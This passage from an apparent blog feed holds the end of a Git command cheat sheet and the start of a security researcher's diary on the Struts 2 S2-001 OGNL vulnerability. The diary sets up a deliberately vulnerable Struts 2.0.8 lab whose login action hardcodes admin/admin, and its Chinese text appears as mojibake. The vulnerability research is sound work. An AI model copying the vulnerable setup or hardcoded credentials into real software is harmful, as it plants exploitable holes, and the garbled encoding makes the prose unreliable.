å¦‚ä½•ä»è¿œç¨‹ä»“åº“è·å–æ•°æ® â€”â€” å‘½ä»¤å¦‚å…¶åï¼Œå®ƒå°±æ˜¯ git fetchã€‚</p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/C9D0C011-8C0B-4BEF-9F82-173097CE43F9.png" alt="dc0218d0303c3fafc7f46aca13bc1b59"></p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/95A0815E-7386-4191-9F31-C9B7C4601103.png" alt="14572931af2dccd8b90678de59bc82ca"><br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/9FB29388-3E83-4488-81CE-5A428D58D98E.png" alt="2c3550421c09404c240c3f1e7431d304"></p><h3 id="Git-Pull"><a href="#Git-Pull" class="headerlink" title="Git Pull"></a>Git Pull</h3><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/7006473F-F4A1-4A7C-82D7-915364267EF3.png" alt="7e289552cb9d3b6c9c52f44cddd22047"><br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/7333D970-4EC4-4036-B55D-BC29FBEA1B33.png" alt="b1ae8cf7f9ef2b9ffbe63519d581aa32"></p><h3 id="Git-fakeTeamwork-master"><a href="#Git-fakeTeamwork-master" class="headerlink" title="Git fakeTeamwork master"></a>Git fakeTeamwork master</h3><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/CA3453C6-DEB1-411C-88E6-D4A558EE9879.png" alt="9b5af660f46f29bfa88c95ae8fafa636"></p><h3 id="Git-Push"><a href="#Git-Push" class="headerlink" title="Git Push"></a>Git Push</h3><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/38A2069A-AB6C-4987-976C-70DA91D8E743.png" alt="1673f41c5be4bba1f7d6ba007b77d2e6"><br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/F2BB9EC5-FC8D-4E8B-818F-DE6F0B07060A.png" alt="fb6426cdc6b2a55e9de9852d70c9aaea"></p><h3 id="å†å²åˆ†æ”¯ï¼ˆå®ç”¨ï¼‰"><a href="#å†å²åˆ†æ”¯ï¼ˆå®ç”¨ï¼‰" class="headerlink" title="å†å²åˆ†æ”¯ï¼ˆå®ç”¨ï¼‰"></a>å†å²åˆ†æ”¯ï¼ˆå®ç”¨ï¼‰</h3><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/C81FACE7-86DC-4F61-8E6B-6797BE791417.png" alt="90a13578ffbb27b78c5996af4fd73fe3"></p><p><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/C1FD79C4-AF85-4342-B5EF-4687F4369A93.png" alt="25d1261efbb01df45777b0947fc48305"><br><img src="/ä»Learn Git Branchingå­¦ä¹ Git.resources/A51EC4C5-2E34-4320-9CBD-F68B7620C464.png" alt="53bb1152ea2586767d47fe0a1e702a84"></p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">git branch æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰åˆ†æ”¯</span><br><span class="line"></span><br><span class="line">git status æŸ¥çœ‹å½“å‰çŠ¶æ€</span><br><span class="line"></span><br><span class="line">git commit æäº¤</span><br><span class="line"></span><br><span class="line">git branch -a æŸ¥çœ‹æ‰€æœ‰çš„åˆ†æ”¯</span><br><span class="line"></span><br><span class="line">git branch -r æŸ¥çœ‹è¿œç¨‹æ‰€æœ‰åˆ†æ”¯</span><br><span class="line"></span><br><span class="line">git commit -am &quot;init&quot; æäº¤å¹¶ä¸”åŠ æ³¨é‡Š</span><br><span class="line"></span><br><span class="line">git remote add origin git@192.168.1.119:ndshow</span><br><span class="line"></span><br><span class="line">git push origin master å°†æ–‡ä»¶ç»™æ¨åˆ°æœåŠ¡å™¨ä¸Š</span><br><span class="line"></span><br><span class="line">git remote show origin æ˜¾ç¤ºè¿œç¨‹åº“originé‡Œçš„èµ„æº</span><br><span class="line"></span><br><span class="line">git push origin master:develop</span><br><span class="line"></span><br><span class="line">git push origin master:hb-dev å°†æœ¬åœ°åº“ä¸æœåŠ¡å™¨ä¸Šçš„åº“è¿›è¡Œå…³è”</span><br><span class="line"></span><br><span class="line">git checkout --track origin/dev åˆ‡æ¢åˆ°è¿œç¨‹devåˆ†æ”¯</span><br><span class="line"></span><br><span class="line">git branch -D master develop åˆ é™¤æœ¬åœ°åº“develop</span><br><span class="line"></span><br><span class="line">git checkout -b dev å»ºç«‹ä¸€ä¸ªæ–°çš„æœ¬åœ°åˆ†æ”¯dev</span><br><span class="line"></span><br><span class="line">git merge origin/dev å°†åˆ†æ”¯devä¸å½“å‰åˆ†æ”¯è¿›è¡Œåˆå¹¶</span><br><span class="line"></span><br><span class="line">git checkout dev åˆ‡æ¢åˆ°æœ¬åœ°devåˆ†æ”¯</span><br><span class="line"></span><br><span class="line">git remote show æŸ¥çœ‹è¿œç¨‹åº“</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line">git rm æ–‡ä»¶å(åŒ…æ‹¬è·¯å¾„) ä»gitä¸­åˆ é™¤æŒ‡å®šæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">git clone git://github.com/schacon/grit.git ä»æœåŠ¡å™¨ä¸Šå°†ä»£ç ç»™æ‹‰ä¸‹æ¥</span><br><span class="line"></span><br><span class="line">git config --list çœ‹æ‰€æœ‰ç”¨æˆ·</span><br><span class="line"></span><br><span class="line">git ls-files çœ‹å·²ç»è¢«æäº¤çš„</span><br><span class="line"></span><br><span class="line">git rm [file name] åˆ é™¤ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">git commit -a æäº¤å½“å‰reposçš„æ‰€æœ‰çš„æ”¹å˜</span><br><span class="line"></span><br><span class="line">git add [file name] æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åˆ°git index</span><br><span class="line"></span><br><span class="line">git commit -v å½“ä½ ç”¨ï¼vå‚æ•°çš„æ—¶å€™å¯ä»¥çœ‹commitçš„å·®å¼‚</span><br><span class="line"></span><br><span class="line">git commit -m &quot;This is the message describing the commit&quot; æ·»åŠ commitä¿¡æ¯</span><br><span class="line"></span><br><span class="line">git commit -a -aæ˜¯ä»£è¡¨addï¼ŒæŠŠæ‰€æœ‰çš„changeåŠ åˆ°git indexé‡Œç„¶åå†commit</span><br><span class="line"></span><br><span class="line">git commit -a -v ä¸€èˆ¬æäº¤å‘½ä»¤</span><br><span class="line"></span><br><span class="line">git log çœ‹ä½ commitçš„æ—¥å¿—</span><br><span class="line"></span><br><span class="line">git diff æŸ¥çœ‹å°šæœªæš‚å­˜çš„æ›´æ–°</span><br><span class="line"></span><br><span class="line">git rm a.a ç§»é™¤æ–‡ä»¶(ä»æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­åˆ é™¤)</span><br><span class="line"></span><br><span class="line">git rm --cached a.a ç§»é™¤æ–‡ä»¶(åªä»æš‚å­˜åŒºä¸­åˆ é™¤)</span><br><span class="line"></span><br><span class="line">git commit -m &quot;remove&quot; ç§»é™¤æ–‡ä»¶(ä»Gitä¸­åˆ é™¤)</span><br><span class="line"></span><br><span class="line">git rm -f a.a å¼ºè¡Œç§»é™¤ä¿®æ”¹åæ–‡ä»¶(ä»æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­åˆ é™¤)</span><br><span class="line"></span><br><span class="line">git diff --cached æˆ– $ git diff --staged æŸ¥çœ‹å°šæœªæäº¤çš„æ›´æ–°</span><br><span class="line"></span><br><span class="line">git stash push å°†æ–‡ä»¶ç»™pushåˆ°ä¸€ä¸ªä¸´æ—¶ç©ºé—´ä¸­</span><br><span class="line"></span><br><span class="line">git stash pop å°†æ–‡ä»¶ä»ä¸´æ—¶ç©ºé—´popä¸‹æ¥</span><br><span class="line"></span><br><span class="line">ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">git remote add origin git@github.com:username/Hello-World.git</span><br><span class="line"></span><br><span class="line">git push origin master å°†æœ¬åœ°é¡¹ç›®ç»™æäº¤åˆ°æœåŠ¡å™¨ä¸­</span><br><span class="line"></span><br><span class="line">ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">git pull æœ¬åœ°ä¸æœåŠ¡å™¨ç«¯åŒæ­¥</span><br><span class="line"></span><br><span class="line">ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">git push (è¿œç¨‹ä»“åº“å) (åˆ†æ”¯å) å°†æœ¬åœ°åˆ†æ”¯æ¨é€åˆ°æœåŠ¡å™¨ä¸Šå»ã€‚</span><br><span class="line"></span><br><span class="line">git push origin server fix:awesome branch</span><br><span class="line"></span><br><span class="line">ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">git fetch ç›¸å½“äºæ˜¯ä»è¿œç¨‹è·å–æœ€æ–°ç‰ˆæœ¬åˆ°æœ¬åœ°ï¼Œä¸ä¼šè‡ªåŠ¨merge</span><br><span class="line"></span><br><span class="line">git commit -a -m &quot;log_message&quot; (-aæ˜¯æäº¤æ‰€æœ‰æ”¹åŠ¨ï¼Œ-mæ˜¯åŠ å…¥logä¿¡æ¯) æœ¬åœ°ä¿®æ”¹åŒæ­¥è‡³æœåŠ¡å™¨ç«¯ ï¼š</span><br><span class="line"></span><br><span class="line">git branch branch_0.1 master ä»ä¸»åˆ†æ”¯masteråˆ›å»ºbranch_0.1åˆ†æ”¯</span><br><span class="line"></span><br><span class="line">git branch -m branch_0.1 branch_1.0 å°†branch_0.1é‡å‘½åä¸ºbranch_1.0</span><br><span class="line"></span><br><span class="line">git checkout branch_1.0/master åˆ‡æ¢åˆ°branch_1.0/masteråˆ†æ”¯</span><br><span class="line"></span><br><span class="line">du -hs</span><br><span class="line"></span><br><span class="line">git branch åˆ é™¤è¿œç¨‹branch</span><br><span class="line"></span><br><span class="line">git push origin:branch_remote_name</span><br><span class="line"></span><br><span class="line">git branch -r -d branch_remote_name</span><br><span class="line"></span><br><span class="line">ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">åˆå§‹åŒ–ç‰ˆæœ¬åº“ï¼Œå¹¶æäº¤åˆ°è¿œç¨‹æœåŠ¡å™¨ç«¯</span><br><span class="line"></span><br><span class="line">mkdir WebApp</span><br><span class="line"></span><br><span class="line">cd WebApp</span><br><span class="line"></span><br><span class="line">git initæœ¬åœ°åˆå§‹åŒ–</span><br><span class="line"></span><br><span class="line">touch README</span><br><span class="line"></span><br><span class="line">git add READMEæ·»åŠ æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">git commit -m &apos;first commit&apos;</span><br><span class="line"></span><br><span class="line">git remote add origin git@github.com:patrilic/test.gitå¢åŠ ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨ç«¯</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-15 09:14:11&lt;br&gt;&lt;img src=&quot;/wallpaper/62840874_p0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="Skills" scheme="http://patrilic.top/categories/Skills/"/>
    
    
      <category term="Git" scheme="http://patrilic.top/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>S2-001 è°ƒè¯•æ—¥è®°</title>
    <link href="http://patrilic.top/2019/08/15/S2-001%20%E8%B0%83%E8%AF%95%E6%97%A5%E8%AE%B0/"/>
    <id>http://patrilic.top/2019/08/15/S2-001 è°ƒè¯•æ—¥è®°/</id>
    <published>2019-08-14T18:11:50.000Z</published>
    <updated>2019-08-20T15:29:42.177Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@ Author: Patrilic<br>@ Time: 2019-8-15 02:11:50<br><img src="/wallpaper/[33861]âŠ-52241977.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å¤ªèœäº†ï¼Œé©¬ä¸Šè¿›å…¥å¤§ä¸‰äº†ï¼Œæœ€è¿‘javaçš„ä¸­é—´ä»¶ä¹Ÿé™†é™†ç»­ç»­çš„çˆ†äº†å¾ˆå¤šæ´ï¼Œç„¶åä¹‹å‰ä¹Ÿç»å¸¸æ¥è§¦ç±»ä¼¼äºWeblogicååºåˆ—åŒ–ã€struts2å‘½ä»¤æ‰§è¡Œä¹‹ç±»çš„æ¼æ´ã€‚å€Ÿç€é‡åˆ·äº†ä¸€éFate Stay Night 06ç‰ˆï¼Œç¡ä¸ç€è§‰ï¼Œå¹²è„†å°±æ¥å¼€å§‹äººç”Ÿä¸­ç¬¬ä¸€ä¸ªS2æ¼æ´åˆ†æ</p><h2 id="0x01-æ¼æ´é“¾æ¥"><a href="#0x01-æ¼æ´é“¾æ¥" class="headerlink" title="0x01 æ¼æ´é“¾æ¥"></a>0x01 æ¼æ´é“¾æ¥</h2><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a><br>å½±å“ç‰ˆæœ¬ï¼š</p><blockquote><p>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p></blockquote><h2 id="0x02-ç¯å¢ƒæ­å»º"><a href="#0x02-ç¯å¢ƒæ­å»º" class="headerlink" title="0x02 ç¯å¢ƒæ­å»º"></a>0x02 ç¯å¢ƒæ­å»º</h2><p>struts2åŒ…ä¸‹è½½åœ°å€ï¼š<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.8-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.8-all.zip</a></p><p>æ­å»ºå¹³å°ï¼š MacOS Mojave 10.14.5<br>ä½¿ç”¨å·¥å…·ï¼š IntelliJ IDEA<br>Tomcatç‰ˆæœ¬ï¼šApache Tomcat 8.5.16 - MxSrvsè‡ªå¸¦</p><p>é¦–å…ˆNewä¸€ä¸ªProject<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/6FA2BAFC-BE8C-4740-B028-5642E9A3EAA8.png" alt="ddca0c177f31ccb51326857cc63de34e"></p><p>å°†éœ€è¦çš„jaråŒ…æ”¾å…¥/WEB-INF/libç›®å½•ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">commons-logging-1.0.4.jar</span><br><span class="line">freemarker-2.3.8.jar</span><br><span class="line">ognl-2.6.11.jar</span><br><span class="line">struts2-core-2.0.8.jar</span><br><span class="line">xwork-2.0.3.jar</span><br></pre></td></tr></table></figure></p><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/C8DBD68B-81B6-4C2D-BBCD-6F87BEEF1CB8.png" alt="19046de56e4a9f83e5eeee434f3ef471"></p><p>åˆ›å»ºindex.jspæ–‡ä»¶<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>åˆ›å»ºwelcome.jspæ–‡ä»¶<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>åœ¨srcç›®å½•ä¸‹åˆ›å»ºPackage <code>com.demo.action</code><br>ç„¶ååˆ›å»ºclass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯¼å…¥åŒ…<br>File-&gt;Project Structure<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/AE8F8103-1317-4E1B-9954-D16381A8BEA7.png" alt="c2721572cd14b75b50bd62cccab3e8dd"><br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/B172D40B-5AF0-4C93-A59F-C2653B0024D9.png" alt="21aff5f519ea4ea23e7ee17e32e7dfaa"></p><p>ç„¶åè®¾ç½®å¥½tomcaté…ç½®å°±å¯ä»¥Runäº†<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/0D2C780D-825D-43A0-A5F6-D66B0862F51B.png" alt="c9de8ac5327705aa2b9825e2f5e0786a"></p><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/37A62E68-1AF0-4309-87FC-DE26FBFC1A36.png" alt="e5e2c3d3929818faaf2e41f45264a79d"></p><p>å¦‚æœé‡åˆ°<code>java.lang.IllegalStateException: struts.properties missing</code>çš„é—®é¢˜<br>æ£€æŸ¥ä¸€ä¸‹è‡ªå·±åˆ›å»ºçš„åŒ…åæˆ–è€…ç±»åæ˜¯å¦ä¸<code>struts.xml</code>ä¸­é…ç½®çš„ä¸€è‡´</p><p>æ¼æ´ç¯å¢ƒå°±å·²ç»æ­å¥½äº†</p><h2 id="0x03-OGNLè¡¨è¾¾å¼"><a href="#0x03-OGNLè¡¨è¾¾å¼" class="headerlink" title="0x03 OGNLè¡¨è¾¾å¼"></a>0x03 OGNLè¡¨è¾¾å¼</h2><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><blockquote><p>OGNLæ˜¯Object-Graph Navigation Languageçš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression Languageï¼Œç®€ç§°ä¸ºELï¼‰ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§ã€‚ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€â€”â€”-ç™¾åº¦ç™¾ç§‘</p></blockquote><p>OGNLçš„ä¸‰è¦ç´ ï¼š</p><p>ã€€ã€€ä¸€ã€è¡¨è¾¾å¼ï¼š</p><p>ã€€ã€€ã€€ã€€è¡¨è¾¾å¼ï¼ˆExpressionï¼‰æ˜¯æ•´ä¸ªOGNLçš„æ ¸å¿ƒå†…å®¹ï¼Œæ‰€æœ‰çš„OGNLæ“ä½œéƒ½æ˜¯é’ˆå¯¹è¡¨è¾¾å¼è§£æåè¿›è¡Œçš„ã€‚é€šè¿‡è¡¨è¾¾å¼æ¥å‘Šè¯‰OGNLæ“ä½œåˆ°åº•è¦å¹²äº›ä»€ä¹ˆã€‚å› 